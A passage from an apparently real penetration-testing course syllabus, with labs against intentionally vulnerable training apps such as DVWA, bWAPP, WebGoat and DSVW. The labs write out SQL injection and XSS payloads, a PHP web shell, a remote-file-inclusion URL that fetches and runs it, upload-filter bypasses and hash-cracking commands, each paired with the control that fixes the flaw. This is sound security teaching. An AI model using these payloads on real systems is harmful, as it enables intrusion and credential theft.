- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) _(link)_
- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

---

## L27: DVWA: Complete SQLi & XSS all difficulty levels

**Week 9** · Module `m9` · DVWA · medium

SQL injection and cross-site scripting remain two of the most exploited vulnerability classes in production web apps, and both let an attacker walk away with something the developer never intended to hand over: full password hashes via a UNION SELECT, or a victim's session cookie via a single unescaped <script> tag. This lab runs both attacks across DVWA's four security tiers, forcing the exact payload evolution real pentesters use against hardening WAFs and sanitizers -- from raw injection at Low, to Burp-intercepted numeric casts and split-tag evasion at Medium, to column-matched UNION queries and non-<script> vectors like <svg onload=> at High. At Impossible, the same payloads fail outright, isolating the two controls that actually stop these classes: PDO prepared statements and htmlspecialchars() output encoding. You'll leave able to both exploit SQLi/XSS through live filtering and name precisely which server-side control defeats each one.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** A set of screenshots showing: the DVWA SQL Injection page returning dumped username/password-hash rows at Low, Medium, and High security; the DVWA XSS (Reflected) page executing an alert()/showing document.cookie at each level; the DVWA XSS (Stored) guestbook entry firing the script automatically on reload; and a final Impossible-level attempt where the same payloads are rendered as inert text or rejected outright.

**Instructions:**

1. Start the DVWA container, log in with admin:password, click 'Create / Reset Database' if this is a fresh instance, then open DVWA Security and set the level to Low
2. SQL Injection (Low): in the User ID field submit 1' OR '1'='1 to dump all users, then submit 1' UNION SELECT user, password FROM users #  to extract the password hashes directly
3. XSS Reflected (Low): submit <script>alert(document.cookie)</script> in the name field; XSS Stored (Low): submit the same payload as a guestbook message and confirm it fires for every visitor who loads the page, not just you
4. Set Security to Medium. SQLi now casts the id parameter with a numeric-looking form field, so intercept the request in Burp Suite and inject directly into the raw POST body; XSS now strips the literal string '<script>', so bypass with a split tag like '<scr'+'ipt>alert(1)</scr'+'ipt>' or an event-handler payload such as <img src=x onerror=alert(1)>
5. Set Security to High. SQLi requires a UNION query with the correct column count wrapped inside the app's existing LIMIT 1 clause; XSS applies a case-insensitive regex against '<script>', so pivot to a non-script vector such as <svg onload=alert(1)> or <iframe src=javascript:alert(1)>
6. Set Security to Impossible. Confirm your prior SQLi payload now fails because DVWA switched to PDO prepared statements, and your XSS payload fails because output is passed through htmlspecialchars() before rendering -- write one sentence per vulnerability naming the exact control that stopped you
7. Capture a screenshot for each of the 8 successful exploits (SQLi + XSS-Reflected + XSS-Stored across Low/Medium/High, noting Stored XSS only needs to be shown once per level) plus one screenshot showing a blocked attempt at Impossible

**Resources:**

- [DVWA (Damn Vulnerable Web Application) source repo](https://github.com/digininja/DVWA) _(tool)_
- [DVWA official container image (GitHub Container Registry)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) _(link)_
- [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) _(link)_
- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) _(link)_
- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) _(link)_

---

## L28: WebGoat: Server-Side Request Forgery lesson

**Week 10** · Module `m10` · WebGoat · medium

Server-side request forgery turns a feature that fetches a URL for you into a way to make the server request things it shouldn't -- internal endpoints, other users' resources, metadata services. WebGoat, OWASP's own training app, has a dedicated SSRF lesson under Request Forgeries that unlocks its green checkmark only when your tampered request actually reaches the forbidden resource -- so it grades the server-side fetch, not just your payload. You register your own account inside WebGoat, open the SSRF lesson, and modify the request's url parameter so the server fetches a resource other than the one the UI offered -- first pointing it at the internal/unintended resource the lesson gates on, then reasoning about why the server trusted a client-supplied destination at all. Because there is no external platform and no shared credentials, everything runs on the target this portal already stands up. You leave able to recognise any URL-fetching feature as a potential internal-network pivot and to describe the allow-list that closes it.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's own lesson tracker showing a green 'Solved' indicator on the Server-Side Request Forgery lesson stage(s), with the tampered url parameter value that triggered the server-side fetch recorded.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path -- and register your own account (or log in with the account from an earlier WebGoat lab)
2. From the left menu, open the 'Request Forgeries' category and select the 'Server-Side Request Forgery' (SSRF) lesson
3. Work the first SSRF stage: use the in-page form (or intercept the request in Burp) that carries a url parameter the server fetches on your behalf, and observe which resource it requests by default
4. Change the url parameter so the server fetches the lesson's target resource instead of the intended one -- the lesson text tells you which resource proves the SSRF -- and submit it
5. Confirm WebGoat marks the stage solved with its green 'Solved' indicator, then complete any second SSRF stage in the same lesson the same way
6. Write two sentences: the exact url value that made the server fetch the unintended resource, and why validating the destination against an allow-list (rather than trusting the client-supplied URL) is the fix
7. Screenshot each stage's green 'Solved' indicator as you complete it

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [OWASP WebGoat project page](https://owasp.org/www-project-webgoat/) _(link)_
- [OWASP: Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) _(link)_
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) _(link)_
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf) _(link)_
- [HackTricks: SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

---

## L29: DVWA: LFI/RFI File Inclusion

**Week 10** · Module `m10` · DVWA · medium

An insecure include() or require() call is one path traversal payload away from leaking /etc/passwd, and one step further from full remote code execution -- the exact escalation this lab walks through on DVWA's File Inclusion module. You'll pull /etc/passwd via directory traversal at Low, then adapt the payload to survive Medium's single-pass '../' and 'http://' strip, before either including and executing a hosted PHP web shell over RFI (confirmed with a live ?cmd=id) or, when allow_url_include is disabled, escalating the same LFI to source disclosure via the php://filter wrapper. At High and Impossible, the same payloads are shut out entirely once the page parameter is locked to a fixed allow-list, showing exactly where the fix has to live. You walk away able to turn a file-inclusion bug into information disclosure or code execution, and to explain why an allow-list -- not a blacklist -- is what actually closes it.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Screenshots showing the raw contents of /etc/passwd rendered inside the DVWA File Inclusion page via the traversal payload, plus either (a) command output such as uid=... from a successfully included remote shell (RFI) or (b) base64-decoded PHP source recovered via php://filter if RFI is disabled in the environment, with a one-line note on which path was used.

**Instructions:**

1. Set DVWA Security to Low and open the File Inclusion module; note the page parameter loads local files by name, e.g. ?page=include.php
2. Perform LFI by directory traversal: request ?page=../../../../../../etc/passwd (add or remove ../ segments until the file resolves) and confirm the passwd contents are rendered in the page
3. Set Security to Medium; DVWA now strips the literal strings 'http://' and '../' once -- bypass with a payload that survives a single-pass strip, e.g. ....//....//....//....//....//....//etc/passwd or an absolute path like /etc/passwd directly
4. For RFI, first confirm allow_url_include is enabled in the container's php.ini (DVWA's default config enables it for this exercise); if disabled, note that as the real-world mitigation and skip to the LFI-to-RCE variant instead
5. Host a one-line PHP web shell (<?php system($_GET['cmd']); ?>) on a second local web server (e.g. python3 -m http.server 8000) reachable from the DVWA container
6. At Low security, set ?page=http://<your-host-ip>:8000/shell.php to include and execute the remote file, then confirm code execution with ?page=http://<your-host-ip>:8000/shell.php&cmd=id
7. If RFI is unavailable, instead escalate the LFI to code execution via PHP wrapper log poisoning or php://filter (e.g. ?page=php://filter/convert.base64-encode/resource=include.php) to read source code, decode it, and document the technique
8. Set Security to High and Impossible; confirm the page parameter is now restricted to a fixed allow-list (fi.php basic/include etc.) and document why the earlier payloads no longer work

**Resources:**

- [DVWA (Damn Vulnerable Web Application) source repo](https://github.com/digininja/DVWA) _(tool)_
- [DVWA official container image (GitHub Container Registry)](https://github.com/digininja/DVWA/pkgs/container/dvwa) _(tool)_
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) _(link)_
- [PayloadsAllTheThings: File Inclusion / Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) _(tool)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

---

## L30: bWAPP: web-shell upload past extension and Content-Type checks

**Week 10** · Module `m10` · bWAPP · hard

An upload form that trusts the filename or the declared Content-Type instead of the file's actual contents is one of the shortest paths to remote code execution. bWAPP's Unrestricted File Upload page provides exactly that, and its security-level slider (low/medium/high) lets you watch a real, partial filter tighten across attempts. At low, you upload a one-line PHP web shell outright and trigger it with ?cmd=id. At medium, the app checks the declared Content-Type, so you resend the same bytes in Burp with the multipart header relabeled to image/jpeg. At high, an extension check forces an alternate PHP extension (.phtml/.php5) or a double-extension trick. Each round ends the same way -- browsing to the planted shell and running a command -- so you leave able to see that extension and Content-Type are both client-controlled metadata, not content validation, and to build the bypass each check demands.

**Docker:** `docker run -d -p 18080:80 raesene/bwapp`

**Completion evidence:** Screenshots showing the bWAPP-hosted PHP shell returning ?cmd=id output at low security, plus the same code execution achieved after bypassing the medium Content-Type check (relabeled image/jpeg) and the high extension check (alternate/double extension), with the exact bypass noted per level.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click the install button to build bWAPP's database (a one-time step every fresh bWAPP container needs)
2. Log in with bWAPP's documented default credentials bee / bug, then set the security level (top right) to low
3. Open the 'Unrestricted File Upload' bug from the dropdown; create a one-line PHP web shell <?php system($_GET['cmd']); ?> as shell.php and upload it at low security
4. Follow the returned link to the uploaded file (bWAPP stores it under a path such as /images/), browse to it with ?cmd=id, and confirm the command output proves code execution
5. Raise the security level to medium and re-upload shell.php; when it is blocked on Content-Type, resend the upload in Burp Repeater with the multipart part's Content-Type changed to image/jpeg while leaving the PHP bytes unchanged, then re-trigger the shell
6. Raise the security level to high; when the extension is now checked, bypass it with an alternate executable extension such as shell.phtml or shell.php5 (or a double extension like shell.php.jpg where the server still executes it as PHP), then trigger the shell one more time
7. For each of the three levels, record the exact bypass used and the resulting ?cmd=id output

**Resources:**

- [bWAPP official page (itsecgames.com)](http://www.itsecgames.com) _(link)_
- [bWAPP on Docker Hub](https://hub.docker.com/r/raesene/bwapp) _(tool)_
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) _(link)_
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) _(link)_
- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

---

## L31: DSVW: server-side template injection, detect to code execution

**Week 10** · Module `m10` · DSVW · hard

Server-side template injection happens when user input is rendered as template/format syntax instead of plain data, and how far it escalates depends entirely on which engine sits behind it. Damn Small Vulnerable Web exposes a template-injection endpoint (the tmpl parameter) inside its single small Python file, which makes it the cleanest place to walk the whole detect -> confirm -> escalate path and then read the exact code that caused it. DSVW does NOT use a Jinja2-style engine -- it feeds your input straight into Python's str.format() as the format string, with an open file object and the os module as the available arguments, so the payload syntax is single-brace format fields ({0.__class__}), not {{7*7}}. You send a probe to see whether your input is evaluated, confirm real evaluation by reading a field off one of those arguments, then walk attributes and indices to reach dangerous references such as os.system and disclose internal objects. (Python format-string injection can traverse attributes/keys but cannot itself call a function, so this is a runtime-reachability and information-disclosure primitive rather than one-request command execution.) Finally you open DSVW's source and find the .format() call that fed user input straight in as the format string. Because the vulnerable line and the exploit sit in the same readable file, you leave able to fingerprint an engine from its behaviour, reach the runtime through it, and name the code pattern behind it.

**Docker:** `docker run -d -p 18080:8000 appsecco/dsvw`

**Completion evidence:** The raw response showing DSVW evaluating a single-brace format-field payload ({0.__class__} returning a Python class) and a follow-up payload reaching the os module (e.g. {1.__dict__[system]} rendering the os.system built-in), paired with the DSVW source line -- tmpl.format(open(__file__), os) -- that rendered user input as the format string.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's landing page listing its vulnerability categories, and locate the server-side template injection endpoint -- the tmpl parameter (i.e. /?tmpl=...)
2. Probe whether the input is evaluated rather than just echoed: submit a single-brace format field such as /?tmpl={0.__class__} and watch whether it renders as a Python class (evaluated) or is printed literally
3. Confirm real evaluation: /?tmpl={0.__class__} should return a class like <class '_io.TextIOWrapper'> -- proof your input is being consumed as a str.format() format string, not echoed. Note DSVW is NOT Jinja2, so a {{7*7}} payload just prints the literal {7*7}; single-brace format fields are the correct syntax here
4. Escalate by walking the format-string object model to reach the Python runtime: DSVW calls tmpl.format(open(__file__), os), so argument {1} is the os module -- /?tmpl={1.__dict__[system]} reaches os.system and renders <built-in function system>, proving the template can reach dangerous callables
5. Record what the format-string sink exposes -- reaching os.system via {1.__dict__[system]} and disclosing the open source-file object via {0} -- and note that pure str.format() syntax can traverse attributes/keys but cannot itself CALL a function, so this is runtime-reachability/info-disclosure rather than one-request command execution
6. Open DSVW's single-file source (linked in Resources, or view it inside the container) and find the render/format call that passed user input directly in as the format string -- the tmpl.format(open(__file__), os) line, with no sandboxing
7. Write two sentences: the confirmation payload ({0.__class__}) and the runtime-reaching payload ({1.__dict__[system]}), and the one-line change (render untrusted input as data, never as the format string itself) that fixes it

**Resources:**

- [DSVW (GitHub)](https://github.com/appsecco/dsvw) _(tool)_
- [PayloadsAllTheThings: Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) _(tool)_
- [OWASP: Server-Side Template Injection (WSTG)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection) _(link)_
- [tplmap: SSTI detection and exploitation tool](https://github.com/epinna/tplmap) _(tool)_
- [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) _(link)_

---

## L32: bWAPP: price and quantity tampering in the ticket order flow

**Week 10** · Module `m10` · bWAPP · medium

Business logic flaws slip past every input filter because the requests are perfectly well-formed -- the bug is that the server trusts a value it should have recomputed. bWAPP's 'Insecure DOR (Order Tickets)' page is a textbook case: the ticket price and quantity travel in a request the client controls, and the server bills whatever arrives. You place a normal order, intercept the POST in Burp, and tamper the price parameter to a fraction of its real value -- or set a negative quantity to invert the total -- then confirm the server accepts the manipulated order. Raising the security level shows where a real fix belongs: re-deriving the price from the catalog server-side and validating quantity bounds. None of this uses an injection payload; the finding is the missing server-side re-validation, exactly the class automated scanners miss.

**Docker:** `docker run -d -p 18080:80 raesene/bwapp`

**Completion evidence:** Screenshots of the intercepted bWAPP Order Tickets POST with a tampered ticket_price (and/or negative ticket_quantity) accepted by the server at low security, plus confirmation that raising the security level rejects or re-derives the same tampered request.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click install (one-time DB setup), then log in with bee / bug and set the security level to low
2. From the bug dropdown, open 'Insecure DOR (Order Tickets)' (an Insecure Direct Object Reference / ticket order flow), and place a normal ticket order to see the baseline total
3. Intercept the order POST in Burp Suite and identify the client-controlled parameters -- the ticket_price and ticket_quantity (or equivalently named) fields carried in the request
4. Tamper the price: change ticket_price to a fraction of its real value, forward the request, and confirm the server bills the manipulated amount rather than re-deriving it from the catalog
5. Tamper the quantity: try a negative or out-of-range ticket_quantity and observe whether the server computes a nonsensical (e.g. negative) total, proving no bounds check exists
6. Raise the security level and resend the same tampered request; confirm the server now rejects or re-derives the value, and note where the fix lives
7. Write one sentence per finding naming the missing server-side control: price re-derivation from the catalog, and quantity bounds validation -- the actual finding, not just the cheap order

**Resources:**

- [bWAPP official page (itsecgames.com)](http://www.itsecgames.com) _(link)_
- [bWAPP on Docker Hub](https://hub.docker.com/r/raesene/bwapp) _(tool)_
- [OWASP Web Security Testing Guide: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [OWASP: Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering) _(link)_
- [PortSwigger: Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

---

## L33: In-House Range: Solo Recon-to-Exploit Methodology

**Week 11** · Module `m11` · In-House Docker Range · medium

Every real engagement starts the same way: a bare target, no walkthrough, and a recon-to-exploit process you have to run yourself end to end. This lab hands you that exact loop against a target the portal starts for you — a DVWA container mapped to localhost:18080 — with no external account, VPN, or queue to wait on. You'll enumerate it cold with nmap and curl exactly as you would a real host, identify a vulnerability class from what you find rather than being told which lab page to open, exploit it, and document the full chain the way a real report demands: target overview, recon findings, exploitation steps, and what generalizes to a production engagement. Working it solo, with nothing pre-selected for you, is the first time in the programme you run a complete OSCP-style engagement start to finish on your own.

**Docker:** `docker run -d -p 18080:80 ghcr.io/digininja/dvwa:latest`

**Completion evidence:** Saved nmap/curl recon output against localhost:18080, the exact exploitation commands and raw output for the vulnerability you identified, a screenshot proving impact, and a compiled write-up covering Target Overview, Recon Findings, Exploitation Steps, and Proof of Impact.

**Instructions:**

1. Click 'Start Lab' above to launch the in-house target (DVWA), which the portal maps to localhost:18080 — no account, VPN, or queue required
2. Recon cold: run nmap -sV -p- localhost against it and note every open port and service/version banner, exactly as you would against an unfamiliar host
3. Recon the web service with curl: curl -i http://localhost:18080/ to read response headers, then browse the app manually to map its pages and login flow
4. From what recon turned up, identify a vulnerability class to pursue yourself (e.g. SQL injection in a login or search field, reflected/stored XSS, weak default credentials) rather than being told which one to attack
5. Exploit the vulnerability you identified, saving the exact request/command and its raw output at each step
6. Confirm impact concretely — e.g. a dumped credential, an executed script, or data extracted that shouldn't have been accessible — and capture a screenshot proving it
7. For every step, save the exact commands run and their raw output before moving on — you'll need them for the write-up and you cannot reconstruct them from memory later
8. Write a report section (Target Overview, Recon Findings, Exploitation Steps, Proof of Impact, one paragraph on what generalizes to real engagements) covering the full chain

**Resources:**

- [Nmap official docs (Reference Guide)](https://nmap.org/book/man.html) _(link)_
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [DVWA (Damn Vulnerable Web Application) source repo](https://github.com/digininja/DVWA) _(tool)_
- [Hack The Box – Starting Point (optional extra practice)](https://app.hackthebox.com/starting-point) _(platform)_
- [VulnMachines](https://vulnmachines.com) _(platform)_
- [GTFOBins](https://gtfobins.github.io) _(link)_
- [Exploit-DB](https://www.exploit-db.com) _(tool)_

---

## L34: Hashcat: Crack provided MD5 and SHA-256 hashes

**Week 11** · Module `m11` · Hashcat · medium

Credential dumps show up in almost every real post-exploitation and CTF scenario, and what happens next depends entirely on whether the hashes are salted. This lab puts you on the attacker's side of that gap: crack a batch of your own MD5 and SHA-256 hashes with Hashcat against rockyou.txt, escalate to rule-based mutation (best64.rule) for the passwords a plain dictionary attack misses, and cross-verify results with John the Ripper. Watching Hashcat's live Recovered/Speed/Time status block also makes visible why GPU-backed cracking on bare metal so heavily outpaces VM-bound cracking -- exactly the slowdown the lab has you expect going in. You leave able to pick the correct hash mode, run and escalate a real cracking attack, and explain precisely why raw MD5/SHA-256 fail where salted bcrypt/Argon2 would hold.

**Completion evidence:** Terminal screenshot of `hashcat -m 0 md5_hashes.txt --show` and `hashcat -m 1400 sha256_hashes.txt --show`, each line showing the original hash next to its cracked plaintext password.

**Instructions:**

1. Install hashcat (bundled on Kali; otherwise apt/brew install hashcat). Download the three hash/wordlist files from the Lab Files section above — everything you need is hosted in-portal, no rockyou download required
2. Optional (to see how the hashes are made): pick a word and hash it with echo -n 'password' | md5sum and echo -n 'password' | sha256sum — this is exactly how the provided hashes were generated
3. Confirm hash length maps to mode: MD5 = 32 hex chars = mode 0; SHA2-256 = 64 hex chars = mode 1400 (cross-check against hashcat's example_hashes wiki page)
4. Run the MD5 batch against the provided wordlist: hashcat -a 0 -m 0 hashes-md5.txt wordlist.txt
5. Run the SHA-256 batch: hashcat -a 0 -m 1400 hashes-sha256.txt wordlist.txt
6. If your hash file includes usernames alongside each hash, add --username so hashcat parses that column instead of treating it as part of the hash
7. For any hash rockyou.txt alone doesn't crack, apply hashcat's bundled rule file: hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r rules/best64.rule
8. Cross-check at least one hash with John the Ripper: john --format=raw-SHA256 sha256_hashes.txt --wordlist=rockyou.txt, then john --show --format=Raw-SHA256 sha256_hashes.txt to re-display the cracked result without re-running
9. Display all hashcat-cracked results: hashcat -m 0 md5_hashes.txt --show and hashcat -m 1400 sha256_hashes.txt --show
10. While a job runs, watch the live status block (Recovered, Progress, Speed in kH/s, Time.Started/Estimated) to judge throughput and completion - note if you're running inside a VM without GPU passthrough, expect a large slowdown versus bare-metal GPU cracking
11. For each hash, record whether it cracked instantly, needed a rule, or didn't crack at all - and why (length, complexity, dictionary coverage)
12. Write a short note on why salted bcrypt/Argon2 (not tested here) would resist this exact attack while raw MD5/SHA-256 does not

**Resources:**

- [Hashcat](https://hashcat.net/hashcat/) _(tool)_
- [Hashcat example hashes wiki (mode reference)](https://hashcat.net/wiki/doku.php?id=example_hashes) _(link)_
- [Hashcat rule-based attack wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) _(link)_
- [SecLists (wordlists incl. rockyou variants)](https://github.com/danielmiessler/SecLists) _(tool)_

---

## L35: Python: TCP port scanner script

**Week 11** · Module `m12` · Python · medium

Every pentest and CTF starts with a port scan, but running nmap -p- without understanding what happens on the wire leaves a gap real practitioners are expected to close. This lab has you build that exact primitive yourself: a Python scanner that opens a raw socket.AF_INET/SOCK_STREAM connection per port, reads connect_ex() return codes to determine open/closed, and parallelizes the whole sweep with ThreadPoolExecutor so a 65535-port range finishes in seconds, the way the lab's own timed run demonstrates. You validate your own tool by diffing its output against a live nmap -p- -T4 scan of the same host, exposing where a hand-rolled connect scan agrees — and disagrees — with the industry-standard tool. You walk away understanding exactly what a TCP connect scan does at the socket level, not just how to invoke one.

**Completion evidence:** Terminal screenshot of scanner.py's output listing open ports on the target, placed alongside the equivalent `nmap -p-` output for the same host, plus the script's source file.

**Instructions:**

1. Create scanner.py and use argparse to accept --target (IP) and --ports (e.g. '1-1024' or a comma-separated list)
2. Parse the ports argument into a concrete list of ints, supporting both range and comma-list syntax
3. For each port, open socket.socket(socket.AF_INET, socket.SOCK_STREAM) and set a short timeout with settimeout(0.5)
4. Call sock.connect_ex((target, port)) and treat a return value of 0 as 'open'; print each open port immediately (flush stdout) for live feedback on long scans
5. Always close the socket after each check (sock.close()) to avoid file-descriptor exhaustion on large ranges
6. Wrap the per-port scan in concurrent.futures.ThreadPoolExecutor (e.g. max_workers=100) — a sequential loop over 65535 ports is impractically slow
7. Add a --threads argument to control worker count, and print total scan duration using time.time() deltas
8. Only ever point this at a host you own or a designated lab target (your own Metasploitable2 VM or an HTB machine you're authorized on) — scanning third parties without permission is illegal in most jurisdictions
9. Validate accuracy: run nmap -p- -T4 <target> against the same host and diff the two open-port lists, explaining any discrepancy you find

**Resources:**

- [Python socket module docs](https://docs.python.org/3/library/socket.html) _(link)_
- [Python concurrent.futures docs](https://docs.python.org/3/library/concurrent.futures.html) _(link)_
- [Metasploitable2 (legal local scan target)](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) _(tool)_
- [Nmap official docs](https://nmap.org/book/man.html) _(link)_

---

## L36: Python: Subdomain brute-forcer script

**Week 11** · Module `m12` · Python · medium

Subdomain enumeration is the opening move of almost every external engagement — tools like amass and subfinder exist because a company's real attack surface is rarely just the domain named in the scope letter. This lab has you build the pattern those tools run on rather than just invoking them: resolve each candidate hostname from a real SecLists wordlist with socket.gethostbyname() first, filtering out the vast majority of non-existent subdomains before any HTTP request fires, then probe only the survivors over HTTP and HTTPS and parallelize the whole sweep with ThreadPoolExecutor. You close the loop by cross-checking your results against crt.sh's certificate-transparency data, seeing directly where active brute-forcing and passive OSINT diverge. You walk away able to explain — and reproduce — the resolve-then-probe pattern underneath every subdomain enumeration tool you'll use afterward.

**Completion evidence:** Terminal screenshot of subbrute.py's output listing discovered live subdomains (hostname, scheme, status code) for the test domain, next to the script's source code.

**Instructions:**

1. Create subbrute.py with argparse accepting --domain and --wordlist (default to a real SecLists file, not a hand-typed list)
2. Pull a real wordlist: clone SecLists or curl the raw file for Discovery/DNS/subdomains-top1million-5000.txt
3. For each word, build the candidate hostname f'{word}.{domain}'
4. Resolve DNS first with socket.gethostbyname(candidate) inside a try/except socket.gaierror block — this cheaply filters out the vast majority of non-existent subdomains before touching HTTP
5. For candidates that resolve, send requests.get(f'http://{candidate}', timeout=3) and an HTTPS variant (requests.get(..., verify=False)), catching requests.exceptions.RequestException
6. Print every subdomain that responds, along with its scheme (http/https) and status code
7. Parallelize with concurrent.futures.ThreadPoolExecutor (e.g. max_workers=30) since sequential DNS+HTTP checks over a 5,000-word list are too slow one at a time
8. Only run this against a domain you own/control or one you have explicit written authorization to test — stay in scope even for passive-feeling enumeration
9. Cross-check your results against a passive source for the same domain, crt.sh (certificate transparency), and note what your brute-forcer found that crt.sh didn't, and vice versa

**Resources:**

- [SecLists: Discovery/DNS wordlists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS) _(tool)_
- [Python requests library docs](https://requests.readthedocs.io) _(link)_
- [crt.sh certificate transparency search](https://crt.sh) _(tool)_
- [Python socket module docs](https://docs.python.org/3/library/socket.html) _(link)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

---

## L37: Wireshark: identify the C2 beacon in a provided PCAP

**Week 12** · Module `m14` · Wireshark · medium

Real command-and-control traffic doesn't look like a Hollywood hacking scene — it looks like one HTTP GET hidden among a lot of ordinary-looking browser requests, distinguishable only by its suspiciously exact timing. This lab has you find that needle in a real, publicly-published malware PCAP from malware-traffic-analysis.net: sort Statistics > Conversations for an outlier destination, confirm the heartbeat in the IO Graph, follow the TCP/TLS stream for payload and user-agent artifacts, then time the exact beacon interval and cross-reference the destination against abuse.ch URLhaus threat intel. You close by writing up the finding the way a SOC analyst would — destination, interval, signature, and a concrete Zeek/Suricata detection rule for the exact pattern. You leave able to spot a beacon buried in real traffic and turn it into an actionable detection, not just a diagnosis.

**Completion evidence:** Wireshark screenshot showing the IO Graph's periodic beacon spikes plus the Conversations table row for the suspect IP, annotated in your write-up with the computed beacon interval and destination IP/domain.

**Instructions:**

1. Go to malware-traffic-analysis.net's training-exercises page and pick one exercise whose task description explicitly asks you to identify a C2/beacon destination and interval
2. Download the exercise zip and unzip it with the password given on that exercise's own page (the site's standard convention is an 'infected'-based password, but always confirm the current one on the page — it can vary by exercise)
3. Open the .pcap in Wireshark, then check Statistics -> Conversations (TCP/UDP tabs), sorting by packet count/duration to spot one destination IP with unusually frequent, evenly-spaced connections
4. Check Statistics -> IO Graph with a 1-10 second interval and look for a flat, repeating spike pattern — that periodic 'heartbeat' shape is the signature of a beacon versus organic human browsing
5. Right-click a packet to/from the suspect IP -> Follow -> HTTP Stream or TLS Stream to inspect payload, user-agent, URI pattern, or certificate/SNI details for identifiable C2 artifacts
6. Filter on just that IP (ip.addr == x.x.x.x) and use the Conversations 'Duration' and packet-count columns to compute the beacon interval between successive connections
7. Cross-reference the destination IP/domain against a threat-intel source such as abuse.ch URLhaus to confirm it's documented malicious infrastructure
8. Optional depth: complete TryHackMe's Zeek and Brim rooms first if the traffic-analysis fundamentals feel shaky, then repeat the same pcap using Zeek logs/Brim for a log-based view of the same beacon
9. Write up: beacon destination IP/domain, interval, protocol/port, any identifiable C2 signature, and how you'd write a Zeek/Suricata detection rule for this exact pattern

**Resources:**

- [malware-traffic-analysis.net: training exercises](https://www.malware-traffic-analysis.net/training-exercises.html) _(tool)_
- [Wireshark](https://www.wireshark.org) _(tool)_
- [TryHackMe: Network Monitoring with Zeek](https://tryhackme.com/room/networkmonitoringwithzeek) _(platform)_
- [TryHackMe: Brim](https://tryhackme.com/room/brim) _(platform)_
- [abuse.ch URLhaus](https://urlhaus.abuse.ch) _(link)_
- [Wireshark Documentation](https://www.wireshark.org/docs/) _(link)_

---

## L38: CAPSTONE: 48-hour pentest simulation

**Week 12** · Module `m15` · Full Pentest · hard

Client engagements run on a signed Rules of Engagement and a hard deadline — the shell you land partway through exploitation is worthless to the client if it never turns into a CVSS-scored, remediation-ready report by hour 48. This capstone puts you through that exact constraint: recon, automated and manually-verified vulnerability analysis, exploitation to a confirmed foothold, privilege escalation, and a full PTES-structured report (Executive Summary, Scope, Methodology, Findings, Risk Rating, Recommendations) — all against a real, legally-scoped target in a fixed 48-hour window. Every prior week's skill — from HTB methodology to hash cracking to traffic analysis — gets folded into one continuous engagement instead of an isolated exercise. You walk away having produced the actual deliverable a client pays for: a complete, professional pentest report built under real-world time pressure.

**Completion evidence:** Final PDF/Markdown pentest report containing Executive Summary, Scope, Methodology, Detailed Findings with CVSS scores and evidence screenshots, and Remediation/Strategic Recommendations — plus a screenshot of the initial foothold and privesc proof (e.g. id/whoami showing root/admin) referenced in the findings.

**Instructions:**

1. Hour 0: get your assigned target and written Rules of Engagement (scope, IP/domain allow-list, testing window, emergency contact). If self-directed, assign yourself a real, legal target — e.g. an HTB Starting Point machine or a locally-hosted Metasploitable2/DVWA stack — and write your own one-page ROE before touching it
2. Hours 0-4 (Recon): passive OSINT (WHOIS, Shodan, crt.sh, Google dorking) plus active discovery (nmap -sV -p- against every in-scope host); log every command and its raw output as you go
3. Hours 4-10 (Vulnerability analysis): run an automated scanner (Nessus Essentials or OpenVAS/Greenbone) against discovered services, then manually verify at least your top 5 findings aren't false positives
